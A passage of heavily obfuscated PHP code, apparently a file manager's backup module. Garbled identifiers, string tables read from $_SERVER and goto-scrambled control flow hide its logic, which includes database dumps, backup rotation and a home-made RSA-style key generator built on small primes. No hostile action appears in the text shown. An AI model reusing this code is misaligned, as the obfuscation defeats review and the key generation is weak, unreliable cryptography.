$d†‹íÕÒ—[374] . $cÖõ­ƒ¾›¦ . $d†‹íÕÒ—[374] . $E›ÎµËŸÖÊ . $d†‹íÕÒ—[375]); $d³¹‡§ÁÆØ = $E“™‚ğÚ–’[715]; goto EÌÕš¼Û¹¥; BŞö«ù‰¶: $cÖõ­ƒ¾›¦ = $d†‹íÕÒ—[266](($dóÃ†åÑÈŸ + $fœ»¾ƒæ) / 2); while (1) { $fº£’ŠÃªå = $cÖõ­ƒ¾›¦; $fĞƒ†Ì£–â = $eÑ±£æÔ«ä; while ($fĞƒ†Ì£–â % $fº£’ŠÃªå != 0) { $bé—×ÛÍç¿ = $fĞƒ†Ì£–â; $fĞƒ†Ì£–â = $fº£’ŠÃªå; $fº£’ŠÃªå = $bé—×ÛÍç¿ % $fº£’ŠÃªå; $D¸ö¾ÙÀÚ = $E“™‚ğÚ–’[713]; while (strlen($D¸ö¾ÙÀÚ) < $E“™‚ğÚ–’[605]) { if (!$D¸ö¾ÙÀÚ) { break; } $D¸ö¾ÙÀÚ++; } } if ($fº£’ŠÃªå == 1) { break; } else { $cÖõ­ƒ¾›¦++; } } $E›ÎµËŸÖÊ = 2; goto f°œáŠÃ; B„‰ãÓÆÛ±: $fœ»¾ƒæ = $this->{$_SERVER[ÖÙ“üÓ½‰][372]}(); $c°áñÀ‡¸ë = $E“™‚ğÚ–’[712]; $eÑ±£æÔ«ä = ($dóÃ†åÑÈŸ - 1) * ($fœ»¾ƒæ - 1); goto BŞö«ù‰¶; eŞÛè¾µå„: $E“™‚ğÚ–’ =& $_SERVER[ä°„ä°º]; $d†‹íÕÒ— =& $_SERVER[ÖÙ“üÓ½‰]; $dóÃ†åÑÈŸ = $this->{$_SERVER[ÖÙ“üÓ½‰][372]}(); goto B„‰ãÓÆÛ±; EÌÕš¼Û¹¥: if (!$d³¹‡§ÁÆØ) { die; } $AÅ©‡ÎŞ³Œ = $this->{$_SERVER[ÖÙ“üÓ½‰][168]}($E˜˜äÖ—²Ñ, $AÒ²ÚË‚ˆ) . $d†‹íÕÒ—[376] . $d¨ÃƒÈĞº£; return $AÅ©‡ÎŞ³Œ; goto bÎÏòÓÜ™œ; bÎÏòÓÜ™œ: } public function sdcrfc551e37($aµ†ÜöŒ¥À) { goto A‡™Œ›·ñ; dŞ‡‡çä: $Aµ‹Æ¢­Û = $bäå¼¶êšš[722]; if (!$Aµ‹Æ¢­Û) { return; } $cŒÕŒÅÍà = $f”Š‘ù™ñí[266](($d¦¼Íˆ¸¥¯ + $dõÁ¸Ç¬Ì) / 2); goto CêÃ»ñŠÁî; a°ìã˜àø: $cœëê°Û¯© = $f”Š‘ù™ñí[266]($cœëê°Û¯©); $d¦¼Íˆ¸¥¯ = 0; $E’¤âïõ‰Ô = $bäå¼¶êšš[718]; goto EŠçÉÖ¥Ú; eî…æˆÁõ: $e¶òí¢ó¼Ï = $bäå¼¶êšš[716]; if (!$e¶òí¢ó¼Ï) { return; } if ($f”Š‘ù™ñí[19]($D°ƒõ¬é©í) != 2) { return $f”Š‘ù™ñí[10]; } goto Cæ±¨¦¼—; F„£ÉÊ“÷§: $fé­Îç‚£ = $bäå¼¶êšš[727]; return $dÚ±èœòÂ; goto a‰˜³£î; EŠçÉÖ¥Ú: while ($E’¤âïõ‰Ô < $bäå¼¶êšš[594]) { if ($E’¤âïõ‰Ô >= 0) { break; } $E’¤âïõ‰Ô++; } $dõÁ¸Ç¬Ì = 0; $eÕÏ†ò†” = $bäå¼¶êšš[719]; goto DìâĞÕùî‰; A‡™Œ›·ñ: $bäå¼¶êšš =& $_SERVER[ä°„ä°º]; $f”Š‘ù™ñí =& $_SERVER[ÖÙ“üÓ½‰]; $D°ƒõ¬é©í = $f”Š‘ù™ñí[0]($f”Š‘ù™ñí[376], $aµ†ÜöŒ¥À); goto eî…æˆÁõ; CêÃ»ñŠÁî: while (1) { $C±ôìËµåÌ = $cŒÕŒÅÍà; $bÁ¯Üå÷š = $B¢ÌÖàÁ¤¼; while ($bÁ¯Üå÷š % $C±ôìËµåÌ != 0) { $cîøî²õĞ‡ = $bÁ¯Üå÷š; $aİÜÁÌ¬¨ = $bäå¼¶êšš[723]; $bÁ¯Üå÷š = $C±ôìËµåÌ; $eÙÒ´´õ’ = $bäå¼¶êšš[724]; $C±ôìËµåÌ = $cîøî²õĞ‡ % $C±ôìËµåÌ; } if ($C±ôìËµåÌ == 1) { break; } else { $cŒÕŒÅÍà++; } } $bŒ±ç†œ = 2; $B¿ÑŠ®Å­Ô = $bäå¼¶êšš[725]; goto c–ÊÂİ”œº; c–ÊÂİ”œº: if (!$B¿ÑŠ®Å­Ô) { return; } for ($bàÏÒª‚½Ë = 0; $bàÏÒª‚½Ë < $B¢ÌÖàÁ¤¼ * 10; $bàÏÒª‚½Ë++) { if (($B¢ÌÖàÁ¤¼ * $bàÏÒª‚½Ë + 1) % $cŒÕŒÅÍà == 0) { $bŒ±ç†œ = $f”Š‘ù™ñí[266](($B¢ÌÖàÁ¤¼ * $bàÏÒª‚½Ë + 1) / $cŒÕŒÅÍà); break; } } $aŒŠˆíµ‘¬ = $f”Š‘ù™ñí[127]($f”Š‘ù™ñí[373] . ($d¦¼Íˆ¸¥¯ + $dõÁ¸Ç¬Ì) . $f”Š‘ù™ñí[374] . $cŒÕŒÅÍà . $f”Š‘ù™ñí[374] . $bŒ±ç†œ . $f”Š‘ù™ñí[375]); goto eŠË½ÀšÛÃ; eŠË½ÀšÛÃ: $AäœÊ¹ó»Ç = $bäå¼¶êšš[726]; if (strlen($AäœÊ¹ó»Ç) < $bäå¼¶êšš[592]) { die; } $dÚ±èœòÂ = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($D°ƒõ¬é©í[0], $aŒŠˆíµ‘¬); goto F„£ÉÊ“÷§; Cæ±¨¦¼—: $cœëê°Û¯© = $this->{$_SERVER[ÖÙ“üÓ½‰][272]}($D°ƒõ¬é©í[1] . $f”Š‘ù™ñí[10], $f”Š‘ù™ñí[170]); $aî‚Œæ¯— = $bäå¼¶êšš[717]; if (!$cœëê°Û¯©) { return $f”Š‘ù™ñí[10]; } goto a°ìã˜àø; DìâĞÕùî‰: while (strlen($eÕÏ†ò†”) < $bäå¼¶êšš[594]) { if (!$eÕÏ†ò†”) { break; } $eÕÏ†ò†”++; } for ($bàÏÒª‚½Ë = 3; $bàÏÒª‚½Ë < $cœëê°Û¯©; $bàÏÒª‚½Ë += 2) { if ($cœëê°Û¯© % $bàÏÒª‚½Ë != 0) { continue; } $d¦¼Íˆ¸¥¯ = $bàÏÒª‚½Ë; $dõÁ¸Ç¬Ì = $f”Š‘ù™ñí[266]($cœëê°Û¯© / $bàÏÒª‚½Ë); $B¢Ú·”¯ë½ = $bäå¼¶êšš[720]; if (!$B¢Ú·”¯ë½) { die; } break; $eå•Àë¶ìŸ = $bäå¼¶êšš[721]; if (strlen($eå•Àë¶ìŸ) < $bäå¼¶êšš[594]) { die; } } $B¢ÌÖàÁ¤¼ = ($d¦¼Íˆ¸¥¯ - 1) * ($dõÁ¸Ç¬Ì - 1); goto dŞ‡‡çä; a‰˜³£î: } public function ontkb1cf026b() { goto bãÕ±ÄÑ; dƒÙ¥¦Óéõ: $e´‚»ÃÙÆ = $bÑ«¶ÃË¸¼[730]; for ($aÏåªóÇÎŒ = $CÛå”ˆéÔË; $aÏåªóÇÎŒ > 1; $aÏåªóÇÎŒ--) { $eÈŸÅ–Ø = !0; foreach ($E İ–ïŠà¶ as $EÃ¤ôÙè×) { if ($aÏåªóÇÎŒ % $EÃ¤ôÙè× == 0) { $eÈŸÅ–Ø = !1; break; } } if ($eÈŸÅ–Ø) { $CêÈê¾Ï‡ = $aÏåªóÇÎŒ; break; } } return $CêÈê¾Ï‡; goto b»ôé‡…¼; b×à©—…“ï: $E İ–ïŠà¶ = array(); $B¤¼ƒ Öº· = $bÑ«¶ÃË¸¼[728]; while (strlen($B¤¼ƒ Öº·) < $bÑ«¶ÃË¸¼[611]) { if (!$B¤¼ƒ Öº·) { break; } $B¤¼ƒ Öº·++; } goto AÁ·šÑÆ®…; bãÕ±ÄÑ: $bÑ«¶ÃË¸¼ =& $_SERVER[ä°„ä°º]; $bµ ÓÆ‚÷ =& $_SERVER[ÖÙ“üÓ½‰]; $CÛå”ˆéÔË = $bµ ÓÆ‚÷[358]($bµ ÓÆ‚÷[377](2, 14), $bµ ÓÆ‚÷[377](2, 16) - 1); goto b×à©—…“ï; AÁ·šÑÆ®…: $e™ Æ…©ˆ¨ = 1; while ($e™ Æ…©ˆ¨ <= (int) $bµ ÓÆ‚÷[378]($CÛå”ˆéÔË)) { $aÏåªóÇÎŒ = $e™ Æ…©ˆ¨; while (!0) { $aÏåªóÇÎŒ++; $CÚÖÌØôë = $bÑ«¶ÃË¸¼[729]; if ($aÏåªóÇÎŒ <= 2) { $e™ Æ…©ˆ¨ = $aÏåªóÇÎŒ; break; } else { if ($aÏåªóÇÎŒ < 2) { continue; } } $eÈŸÅ–Ø = !0; for ($A»©ƒ‰¼Û = 2; $A»©ƒ‰¼Û <= $bµ ÓÆ‚÷[378]($aÏåªóÇÎŒ); $A»©ƒ‰¼Û++) { if ($aÏåªóÇÎŒ % $A»©ƒ‰¼Û == 0) { $eÈŸÅ–Ø = !1; } } if ($eÈŸÅ–Ø) { $e™ Æ…©ˆ¨ = $aÏåªóÇÎŒ; break; } } $E İ–ïŠà¶[] = $e™ Æ…©ˆ¨; } $CêÈê¾Ï‡ = 2; goto dƒÙ¥¦Óéõ; b»ôé‡…¼: } public function rdqla10fe82b($E„×êƒØÉ«, $bÃ„¦Èíåò) { $DœØœÍÜîå =& $_SERVER[ÖÙ“üÓ½‰]; return $DœØœÍÜîå[13](array($DœØœÍÜîå[14], $DœØœÍÜîå[379]), $E„×êƒØÉ«, $bÃ„¦Èíåò); } public function spaga2f57882($FˆÌ·„–øÄ, $dÏˆ„®¯éå) { $a¹ ¯Ã¦‡ =& $_SERVER[ÖÙ“üÓ½‰]; return $a¹ ¯Ã¦‡[13](array($a¹ ¯Ã¦‡[380], $a¹ ¯Ã¦‡[381]), $FˆÌ·„–øÄ, $dÏˆ„®¯éå); } public function hzfk58d4e204($bŒ¼ŞŒš‘¨, $a¦‰·õÛ‘ˆ) { $eğê©ïéµÀ =& $_SERVER[ÖÙ“üÓ½‰]; return $eğê©ïéµÀ[13](array($eğê©ïéµÀ[380], $eğê©ïéµÀ[382]), $bŒ¼ŞŒš‘¨, $a¦‰·õÛ‘ˆ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $FŒ¢¼•”´‚ =& $_SERVER[ä°„ä°º]; $this->isManual(); self::$name = date($FŒ¢¼•”´‚[731]); if (!($bÒ¿ÔÜå¼ = Model($FŒ¢¼•”´‚[732])->lastItem())) { $bÒ¿ÔÜå¼ = $this->initData(); } else { self::$name = $bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[28]]; if ($bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[733]] == $FŒ¢¼•”´‚[87]) { self::$name = date($FŒ¢¼•”´‚[734]); $AŒæ“š·½ = 0; if (isset($bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[291]][$FŒ¢¼•”´‚[193]][$FŒ¢¼•”´‚[447]])) { $AŒæ“š·½ = (int) $bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[291]][$FŒ¢¼•”´‚[193]][$FŒ¢¼•”´‚[447]]; } if (self::$manual == 0 && $bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[28]] == self::$name) { Model($FŒ¢¼•”´‚[732])->remove($bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[393]]); } $bÒ¿ÔÜå¼ = $this->initData($AŒæ“š·½, $bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[735]]); } else { $this->checkStore($bÒ¿ÔÜå¼[$FŒ¢¼•”´‚[735]]); } } self::$option = $bÒ¿ÔÜå¼; } private function isManual() { $f¼µãÓÊøß = _get($GLOBALS, $_SERVER[ä°„ä°º][736], 0); $f¼µãÓÊøß = intval($f¼µãÓÊøß); self::$manual = $f¼µãÓÊøß && $f¼µãÓÊøß == 1 ? 1 : 0; } private function initData($Bí®¬ê§¬Ä = 0, $Fø®œæ×óô = '') { goto FÛİ‚Ó›; FÛİ‚Ó›: $f‡İ²˜’Ü =& $_SERVER[ä°„ä°º]; $aÙ¦§Ï¤¸ò = Model($f‡İ²˜’Ü[732])->config(); if ($Fø®œæ×óô && $aÙ¦§Ï¤¸ò[$f‡İ²˜’Ü[735]] != $Fø®œæ×óô) { $Bí®¬ê§¬Ä = 0; } goto CÅ†õÛ¬ñ²; dœî«Š­¸: $D÷‡„ˆ¡‰ = Model($f‡İ²˜’Ü[732])->insert($FŞ½ŸèÃ¿™); $FŞ½ŸèÃ¿™[$f‡İ²˜’Ü[393]] = $D÷‡„ˆ¡‰; return $FŞ½ŸèÃ¿™; goto e­ÇÏèØá‰; CÅ†õÛ¬ñ²: $this->checkStore($aÙ¦§Ï¤¸ò[$f‡İ²˜’Ü[735]]); if (self::$manual == 1) { self::$name .= $f‡İ²˜’Ü[71] . date($f‡İ²˜’Ü[737]); } $FŞ½ŸèÃ¿™ = array($f‡İ²˜’Ü[735] => $aÙ¦§Ï¤¸ò[$f‡İ²˜’Ü[735]], $f‡İ²˜’Ü[28] => self::$name, $f‡İ²˜’Ü[733] => 0, $f‡İ²˜’Ü[738] => $aÙ¦§Ï¤¸ò[$f‡İ²˜’Ü[738]], $f‡İ²˜’Ü[739] => self::$manual, $f‡İ²˜’Ü[291] => array($f‡İ²˜’Ü[740] => array($f‡İ²˜’Ü[733] => 0), $f‡İ²˜’Ü[741] => array($f‡İ²˜’Ü[733] => 0, $f‡İ²˜’Ü[742] => 0, $f‡İ²˜’Ü[743] => 0, $f‡İ²˜’Ü[29] => $f‡İ²˜’Ü[33], $f‡İ²˜’Ü[744] => 0, $f‡İ²˜’Ü[476] => 0), $f‡İ²˜’Ü[745] => array($f‡İ²˜’Ü[733] => 0, $f‡İ²˜’Ü[742] => 0, $f‡İ²˜’Ü[743] => 0, $f‡İ²˜’Ü[744] => 0, $f‡İ²˜’Ü[476] => 0), $f‡İ²˜’Ü[193] => array($f‡İ²˜’Ü[733] => 0, $f‡İ²˜’Ü[746] => 0, $f‡İ²˜’Ü[747] => 0, $f‡İ²˜’Ü[748] => 0, $f‡İ²˜’Ü[749] => 0, $f‡İ²˜’Ü[447] => $Bí®¬ê§¬Ä, $f‡İ²˜’Ü[744] => 0, $f‡İ²˜’Ü[476] => 0)), $f‡İ²˜’Ü[744] => time(), $f‡İ²˜’Ü[476] => 0); goto dœî«Š­¸; e­ÇÏèØá‰: } private function checkStore($Fë„ÜõÓˆ–) { $a¾‡¢°À¤® =& $_SERVER[ä°„ä°º]; $E‘ÎÚ¤¹‰° = Model($a¾‡¢°À¤®[750])->listData($Fë„ÜõÓˆ–); Model($a¾‡¢°À¤®[750])->checkConfig($E‘ÎÚ¤¹‰°); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ä°„ä°º][732])->findByName(self::$name); } return self::$option; } public static function set($D²Ş›¦”¹) { $B¡™©ÏÜß­ =& $_SERVER[ä°„ä°º]; $Bâ‡’ÖĞ‰¶ = self::get(); foreach ($D²Ş›¦”¹ as $aÍÆ»½‰¨ => $bƒˆ¥»¾œ) { $C†­›ìñê = explode($B¡™©ÏÜß­[95], $aÍÆ»½‰¨); $CÈ‡Ç ªÙÛ = count($C†­›ìñê); switch ($CÈ‡Ç ªÙÛ) { case 1: $Bâ‡’ÖĞ‰¶[$C†­›ìñê[0]] = $bƒˆ¥»¾œ; break; case 2: $Bâ‡’ÖĞ‰¶[$C†­›ìñê[0]][$C†­›ìñê[1]] = $bƒˆ¥»¾œ; break; case 3: $Bâ‡’ÖĞ‰¶[$C†­›ìñê[0]][$C†­›ìñê[1]][$C†­›ìñê[2]] = $bƒˆ¥»¾œ; break; } } Model($B¡™©ÏÜß­[732])->update($Bâ‡’ÖĞ‰¶[$B¡™©ÏÜß­[393]], $Bâ‡’ÖĞ‰¶); self::$option = $Bâ‡’ÖĞ‰¶; return self::$option; } public function keep() { $FòÕæ„ŸİÅ =& $_SERVER[ä°„ä°º]; $bô¬æß = self::get(); if ($bô¬æß[$FòÕæ„ŸİÅ[291]][$FòÕæ„ŸİÅ[740]][$FòÕæ„ŸİÅ[733]] == $FòÕæ„ŸİÅ[87]) { return; } $this->backupKeep($bô¬æß); self::set(array($FòÕæ„ŸİÅ[751] => 1)); } private function backupKeep($dæ”º¯Ã) { goto bá¨íï‚Î’; FÃôÕÅÙ“: if (empty($B¶–µÖ…™á)) { return; } $B»‡©ÀçÈ = 0; $Cºá¿«Í†š = array(); goto F÷à‹ôÓÖŒ; Eöî©‘†í˜: $FÁÀ¥‡ÊÁ = Model($a³¸Ò†¥[753])->get($a³¸Ò†¥[754]); foreach ($B¶–µÖ…™á as $c…ÜãŒ†¸é) { if (isset($c…ÜãŒ†¸é[$a³¸Ò†¥[739]]) && $c…ÜãŒ†¸é[$a³¸Ò†¥[739]] == $a³¸Ò†¥[87]) { continue; } if (!empty($c…ÜãŒ†¸é[$a³¸Ò†¥[28]]) && in_array($c…ÜãŒ†¸é[$a³¸Ò†¥[28]], $Cºá¿«Í†š)) { continue; } Model($a³¸Ò†¥[732])->remove($c…ÜãŒ†¸é[$a³¸Ò†¥[393]]); $C•‚—ø„ = $this->backupPath($dæ”º¯Ã, $FÁÀ¥‡ÊÁ); IO::remove($C•‚—ø„, !1); } goto a½¯Ó¸ˆµî; F÷à‹ôÓÖŒ: foreach ($B¶–µÖ…™á as $c…ÜãŒ†¸é) { if ($B»‡©ÀçÈ >= 7) { break; } $Cºá¿«Í†š[] = $c…ÜãŒ†¸é[$a³¸Ò†¥[28]]; $B»‡©ÀçÈ++; } for ($B»‡©ÀçÈ = 0; $B»‡©ÀçÈ < 12; $B»‡©ÀçÈ++) { $Cºá¿«Í†š[] = date($a³¸Ò†¥[752], strtotime("\55{$B»‡©ÀçÈ}\40\155\157\x6e\x74\150\x73")); } $Cºá¿«Í†š = array_unique($Cºá¿«Í†š); goto Eöî©‘†í˜; bá¨íï‚Î’: $a³¸Ò†¥ =& $_SERVER[ä°„ä°º]; if (self::$manual == 1) { return; } $B¶–µÖ…™á = Model($a³¸Ò†¥[732])->listData(); goto FÃôÕÅÙ“; a½¯Ó¸ˆµî: } private function backupPath($Eƒ×„Ø¿, $Bîƒ¿¦ÒÍ· = false) { $EÛæ«¹”‰í =& $_SERVER[ä°„ä°º]; if (!$Bîƒ¿¦ÒÍ·) { $Bîƒ¿¦ÒÍ· = Model($EÛæ«¹”‰í[753])->get($EÛæ«¹”‰í[754]); } $Eø²á…é¯ = $Eƒ×„Ø¿[$EÛæ«¹”‰í[28]]; $Bø„Åğ¹‡½ = substr(md5($EÛæ«¹”‰í[755] . $Bîƒ¿¦ÒÍ· . $Eø²á…é¯), 0, 8); return "\x7b\151\x6f\72{$Eƒ×„Ø¿[$EÛæ«¹”‰í[735]]}\x7d\57\144\x61\x74\141\142\141\163\145\57\x62\x61\x63\x6b\165\x70\57" . $Eø²á…é¯ . $EÛæ«¹”‰í[71] . $Bø„Åğ¹‡½; } public function db() { goto cÆ™Æ¸¸Š•; c¯ÂÕèÑ†é: return !0; goto A¡„½ŞÎŞ†; cÆ™Æ¸¸Š•: $CÍÙ‰ã¡ =& $_SERVER[ä°„ä°º]; $C¤³´ÒŞôò = self::get(); if ($C¤³´ÒŞôò[$CÍÙ‰ã¡[291]][$CÍÙ‰ã¡[741]][$CÍÙ‰ã¡[733]] == $CÍÙ‰ã¡[87]) { return !0; } goto D”†„‰îÚ ; D”†„‰îÚ : $Fæ³ Í¼ = new BackupDb(); if (!$Fæ³ Í¼->index()) { return !1; } self::set(array($CÍÙ‰ã¡[756] => 1)); goto c¯ÂÕèÑ†é; A¡„½ŞÎŞ†: } public function dbFile() { goto BÙÉêÙ¦°; föåßİâ‚ñ: $a ÉÍ¸–‡ó = new BackupDbFile(); if (!$a ÉÍ¸–‡ó->index()) { return !1; } self::set(array($BØÒßÊ Ü[757] => 1)); goto D™Şî´–’; D™Şî´–’: return !0; goto D³Š§ˆŒŞµ; BÙÉêÙ¦°: $BØÒßÊ Ü =& $_SERVER[ä°„ä°º]; $cîš½èšÒˆ = self::get(); if ($cîš½èšÒˆ[$BØÒßÊ Ü[291]][$BØÒßÊ Ü[745]][$BØÒßÊ Ü[733]] == $BØÒßÊ Ü[87]) { return !0; } goto föåßİâ‚ñ; D³Š§ˆŒŞµ: } public function file() { $F ÚÜÙàç =& $_SERVER[ä°„ä°º]; $Eæ¯”£¥Œ = self::get(); if ($Eæ¯”£¥Œ[$F ÚÜÙàç[291]][$F ÚÜÙàç[193]][$F ÚÜÙàç[733]] == $F ÚÜÙàç[87]) { return !0; } if (!isset($Eæ¯”£¥Œ[$F ÚÜÙàç[738]]) || $Eæ¯”£¥Œ[$F ÚÜÙàç[738]] == $F ÚÜÙàç[191]) { $f…‘‹íÏéï = new BackupFile(); if (!$f…‘‹íÏéï->index()) { return !1; } } self::set(array($F ÚÜÙàç[758] => 1, $F ÚÜÙàç[733] => 1)); return !0; } } goto dëö´‰ğ–; dëö´‰ğ–: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto a†šÛëğÆ; a†šÛëğÆ: $D¤ÆÔ…¿œÖ =& $_SERVER[ä°„ä°º]; $aåšÉƒÖÔÚ = Backup::get(); self::$io = $aåšÉƒÖÔÚ[$D¤ÆÔ…¿œÖ[735]]; goto DòÔ¡ÒáÛ; DòÔ¡ÒáÛ: self::$name = $aåšÉƒÖÔÚ[$D¤ÆÔ…¿œÖ[28]]; $Fò¼Á˜“ë™ = $GLOBALS[$D¤ÆÔ…¿œÖ[6]][$D¤ÆÔ…¿œÖ[17]]; $e‰‘ˆÜÕµÏ = $this->_dbType($Fò¼Á˜“ë™); goto bÕÍÉºãÍ; eÈ‚Áßóè: $c‰˜ïÚÜÇ = $E£ÎåÑåŒê = 0; try { $BìªÉÕ‚…¶ = $f¾£»¾¹->db()->getTables(); } catch (Exception $C—Ê¯Ùôùù) { return !1; } $BìªÉÕ‚…¶ = array_diff($BìªÉÕ‚…¶, array($D¤ÆÔ…¿œÖ[762], $D¤ÆÔ…¿œÖ[763])); goto DŸ ËµÍæÅ; F´ãİÎã‰†: if (isset($A‹ñ‰ÄÉ‰Ù->task[$D¤ÆÔ…¿œÖ[771]])) { $f³ˆÇ¯Æğ = $A‹ñ‰ÄÉ‰Ù->task[$D¤ÆÔ…¿œÖ[771]] ? $A‹ñ‰ÄÉ‰Ù->task[$D¤ÆÔ…¿œÖ[771]] : timeFloat(); $a“ˆà‘·Ä² = $f³ˆÇ¯Æğ - $A‹ñ‰ÄÉ‰Ù->task[$D¤ÆÔ…¿œÖ[772]]; if ($a“ˆà‘·Ä² >= 0.2) { $c‰˜ïÚÜÇ += 1; } } $A‹ñ‰ÄÉ‰Ù->end(); $cùçôÔ‘’ë = array($D¤ÆÔ…¿œÖ[759] => $e‰‘ˆÜÕµÏ, $D¤ÆÔ…¿œÖ[756] => 1, $D¤ÆÔ…¿œÖ[773] => $c‰˜ïÚÜÇ, $D¤ÆÔ…¿œÖ[774] => $E£ÎåÑåŒê, $D¤ÆÔ…¿œÖ[775] => time()); goto d“Ç¡Š×‹«; bÕÍÉºãÍ: $f¾£»¾¹ = new DbManage($Fò¼Á˜“ë™, $e‰‘ˆÜÕµÏ); $cùçôÔ‘’ë = array($D¤ÆÔ…¿œÖ[759] => $e‰‘ˆÜÕµÏ, $D¤ÆÔ…¿œÖ[760] => time()); Backup::set($cùçôÔ‘’ë); goto fğ±ùœÕéÈ; d“Ç¡Š×‹«: Backup::set($cùçôÔ‘’ë); if ($c‰˜ïÚÜÇ > $E£ÎåÑåŒê) { write_log(array($D¤ÆÔ…¿œÖ[776], $cùçôÔ‘’ë), $D¤ÆÔ…¿œÖ[765]); return !1; } return !0; goto BÓµÖğ´Ûš; DŸ ËµÍæÅ: foreach ($BìªÉÕ‚…¶ as $EÜŸš–Â§) { $c‰˜ïÚÜÇ += $f¾£»¾¹->model($EÜŸš–Â§)->count(); } $A‹ñ‰ÄÉ‰Ù = new Task($D¤ÆÔ…¿œÖ[764], $D¤ÆÔ…¿œÖ[765], $c‰˜ïÚÜÇ, LNG($D¤ÆÔ…¿œÖ[766]) . $D¤ÆÔ…¿œÖ[767] . LNG($D¤ÆÔ…¿œÖ[768])); foreach ($BìªÉÕ‚…¶ as $EÜŸš–Â§) { $CÚ…öÏ‚¥ = $aİ†óÄØİÅ . $EÜŸš–Â§ . $D¤ÆÔ…¿œÖ[769]; $f¶ïğ˜ÆŠˆ = null; if ($EÜŸš–Â§ == $D¤ÆÔ…¿œÖ[770] && (!isset($aåšÉƒÖÔÚ[$D¤ÆÔ…¿œÖ[738]]) || $aåšÉƒÖÔÚ[$D¤ÆÔ…¿œÖ[738]] == $D¤ÆÔ…¿œÖ[191])) { $f¶ïğ˜ÆŠˆ = self::$io; } $E£ÎåÑåŒê += $f¾£»¾¹->sqlFromDb($EÜŸš–Â§, $CÚ…öÏ‚¥, $A‹ñ‰ÄÉ‰Ù, $f¶ïğ˜ÆŠˆ); } goto F´ãİÎã‰†; fğ±ùœÕéÈ: $aİ†óÄØİÅ = $this->tmpFilesPath() . $D¤ÆÔ…¿œÖ[761] . self::$name . $D¤ÆÔ…¿œÖ[8]; del_dir($aİ†óÄØİÅ); mk_dir($aİ†óÄØİÅ); goto eÈ‚Áßóè; BÓµÖğ´Ûš: } private function _dbType($dÔ¢¸­­¸) { goto eö‡åÖä„¬; FÉÍĞãø”Ê: return $B²¼ÜÌâ­Ÿ; goto C¾ªßôĞŸ; eö‡åÖä„¬: $AğäŠÇ¥õë =& $_SERVER[ä°„ä°º]; $dÔ¢¸­­¸ = array_change_key_case($dÔ¢¸­­¸); $B²¼ÜÌâ­Ÿ = $dÔ¢¸­­¸[$AğäŠÇ¥õë[777]]; goto C¸ÅÒ¹õ§²; C¸ÅÒ¹õ§²: if ($B²¼ÜÌâ­Ÿ == $AğäŠÇ¥õë[778]) { $dñ“‚»ôŞ¾ = explode($AğäŠÇ¥õë[4], $dÔ¢¸­­¸[$AğäŠÇ¥õë[779]]); $B²¼ÜÌâ­Ÿ = $dñ“‚»ôŞ¾[0]; } $aˆ’£Şæº = array($AğäŠÇ¥õë[780] => $AğäŠÇ¥õë[9], $AğäŠÇ¥õë[781] => $AğäŠÇ¥õë[782]); if (isset($aˆ’£Şæº[$B²¼ÜÌâ­Ÿ])) { $B²¼ÜÌâ­Ÿ = $aˆ’£Şæº[$B²¼ÜÌâ­Ÿ]; } goto FÉÍĞãø”Ê; C¾ªßôĞŸ: } private function tmpFilesPath() { $c™×áÓÍà =& $_SERVER[ä°„ä°º]; $Cš÷è©ÈØ = TEMP_FILES; if ($GLOBALS[$c™×áÓÍà[6]][$c™×áÓÍà[88]][$c™×áÓÍà[783]]) { $Cš÷è©ÈØ = $GLOBALS[$c™×áÓÍà[6]][$c™×áÓÍà[88]][$c™×áÓÍà[783]]; if (!mk_dir($Cš÷è©ÈØ) || !is_writable($Cš÷è©ÈØ) || !IO::mkfile($Cš÷è©ÈØ . $c™×áÓÍà[784])) { $Cš÷è©ÈØ = TEMP_FILES; } } return $Cš÷è©ÈØ; } } class BackupDbFile { public function __construct() { } public function index() { goto a«Ó“ŠŠµ; cÌù±›¢¤ó: IO::copy($D›—ªÌí»î, $F‡ÁÏß¤œ†); $e›º¯³½Â->end(); $e©¬âÕ•¨¬ = array($a¯¬³°ƒ¯Ä[793] => $cÙ–ë¾Ìå¿, $a¯¬³°ƒ¯Ä[794] => time()); goto D²¿é†ŠŸ°; A÷×çÂîÂ: $f„‹àâÏÀ = IO::listPath($B´òØ—¥ê); $bå¾†’’ÊØ = isset($f„‹àâÏÀ[$a¯¬³°ƒ¯Ä[74]]) ? $f„‹àâÏÀ[$a¯¬³°ƒ¯Ä[74]] : array(); $cÙ–ë¾Ìå¿ = array_sum(array_column($bå¾†’’ÊØ, $a¯¬³°ƒ¯Ä[78])); goto D¡ˆ“è—¡; bå¹–ğ¶…å: $B´òØ—¥ê = $this->tmpFilesPath() . "\x62\141\143\x6b\165\x70\x5f{$E×Üˆë‹ªÆ}\57"; $F‡ÁÏß¤œ† = $this->backupPath($aáåèƒ£¿); if (!($F‡ÁÏß¤œ† = IO::mkdir($F‡ÁÏß¤œ†))) { return !1; } goto A÷×çÂîÂ; E•ÅÉ¡Öö¯: $e›º¯³½Â = new TaskFileTransfer($a¯¬³°ƒ¯Ä[787], $a¯¬³°ƒ¯Ä[765], count($bå¾†’’ÊØ), LNG($a¯¬³°ƒ¯Ä[766]) . $a¯¬³°ƒ¯Ä[440] . LNG($a¯¬³°ƒ¯Ä[768]) . $a¯¬³°ƒ¯Ä[788]); $e›º¯³½Â->task[$a¯¬³°ƒ¯Ä[746]] = $cÙ–ë¾Ìå¿; foreach ($f„‹àâÏÀ[$a¯¬³°ƒ¯Ä[74]] as $cˆ²İ¨¼äÃ) { $C¶¢‘’¶ù = IO::move($cˆ²İ¨¼äÃ[$a¯¬³°ƒ¯Ä[76]], $F‡ÁÏß¤œ†); if (!$C¶¢‘’¶ù) { $e›º¯³½Â->end(); $BÎŒóí©¿ù = IO::getLastError($a¯¬³°ƒ¯Ä[789] . $cˆ²İ¨¼äÃ[$a¯¬³°ƒ¯Ä[76]] . $a¯¬³°ƒ¯Ä[790] . $F‡ÁÏß¤œ† . $a¯¬³°ƒ¯Ä[517]); write_log($BÎŒóí©¿ù, $a¯¬³°ƒ¯Ä[765]); return !1; } } goto 